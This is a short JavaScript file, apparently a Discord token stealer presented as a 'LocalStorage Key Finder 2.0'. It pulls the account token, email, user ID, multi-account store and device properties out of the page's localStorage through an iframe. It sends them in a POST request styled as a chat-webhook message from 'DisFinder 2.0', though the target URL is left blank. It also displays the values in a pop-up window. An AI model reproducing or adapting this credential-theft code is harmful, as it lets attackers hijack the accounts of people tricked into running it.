function sendRequest(){
    var dba = document.body.appendChild(document.createElement `iframe`).contentWindow.localStorage;
var syscrook = new XMLHttpRequest();
syscrook.withCredentials = true;

   syscrook.addEventListener("readystatechange", function () {
     if (this.readyState === this.DONE) {
     console.log(this.responseText);
  }
});
location.reload();
   syscrook.open("POST", "");
   syscrook.setRequestHeader('Content-Type', 'application/json');
   syscrook.send(
    JSON.stringify({
     content: "DisTokens: " + dba.tokens + "\nDisEmail: " + dba.email_cache + "\nDisCache: " + dba.secretData_cache + "\nDisMultiID: " + dba.MultiAccountStore + "\nDisID: " + dba.user_id_cache + "\nDisToken: " + dba.token + "\nDisProperties: " + dba.deviceProperties,
     username: "DisFinder 2.0",
    // avatar_url: "https://yt3.ggpht.com/ytc/AKedOLSnAJmY_FackkeN9b8IRtCI6-xBrRxx2RZpo4WB6A=s88-c-k-c0x00ffffff-no-rj"
 })
);
    var winds = window.open('local.file/disfile', '', 'width=1000,height=1000');
    winds.document.write("<title>LocalStorage Key Finder 2.0</title><center><h1>LocalStorage Key Finder 2.0 - DisFile</h1><br>")
    winds.document.write("<code>token : <strong>"+dba.token+"</strong></code><br>")
    winds.document.write("<code>tokens : <strong>"+dba.tokens+"</strong></code><br>")
    winds.document.write("<code>email_cache : <strong>"+dba.email_cache+"</strong></code><br>")
    winds.document.write("<code>LayoutStore : <strong>"+dba.LayoutStore+"</strong></code><br>")
    winds.document.write("<code>deviceProperties : <strong>"+dba.deviceProperties+"</strong></code><br>")
    winds.document.write("<code>user_id_cache : <strong>"+dba.user_id_cache+"</strong></code><br>")
    winds.document.write("<code>scientist: : <strong>"+dba.scientist+"</strong></code><br>")
    winds.document.write(`<style>
    body {
      background: #eee;
      font-family: Helvetica Neue, Helvetica, Arial, sans-serif;
    }
    </style></center>`)
}
sendRequest()
